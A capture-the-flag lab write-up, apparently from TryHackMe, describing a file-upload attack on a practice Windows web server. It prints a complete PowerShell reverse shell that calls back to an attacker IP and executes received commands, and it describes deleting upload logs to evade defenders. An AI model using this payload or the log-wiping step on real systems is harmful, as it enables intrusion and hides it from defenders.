Begin by initiating the virtual machine; click on the "Start Machine" button located in the top right corner of the task. Then, access the machine by navigating to 10.10.34.210:8080. This challenge can be tackled either through a VPN connection or by using the AttackBox, which is equipped with all necessary tools.

Bypassing the nmap scan, I directly explored port 8080 and was presented with a webpage that featured file upload functionality.

I set up a Netcat listener on port 9001 and proceeded to craft a PowerShell (ps1) reverse shell payload, which I then uploaded.

Hereâ€™s how I created the ps1 reverse shell:

powershell
Copy code
$LHOST = "10.6.9.14"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
$NetworkStream = $TCPClient.GetStream(); 
$StreamReader = New-Object IO.StreamReader($NetworkStream); 
$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
$StreamWriter.AutoFlush = $true; 
$Buffer = New-Object System.Byte[] 1024; 
while ($TCPClient.Connected) { 
    while ($NetworkStream.DataAvailable) { 
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
    }; 
    if ($TCPClient.Connected -and $Code.Length -gt 1) { 
        $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
        $StreamWriter.Write("$Output`n"); 
        $Code = $null 
    } 
}; 
$TCPClient.Close(); 
$NetworkStream.Close(); 
$StreamReader.Close(); 
$StreamWriter.Close()
Successfully, this granted me a low-level shell access.

While exploring the file system, I discovered a URL: http://10.10.34.210:8000/asdasdadasdjakjdnsdfsdfs.php.

It seems that the Blue team was alerted. A hint suggested that I should delete the file upload logs to access the page. The log files were located at C:\xampp\htdocs\uploads.

After removing all the logs, I successfully retrieved the first flag:

THM{****************}

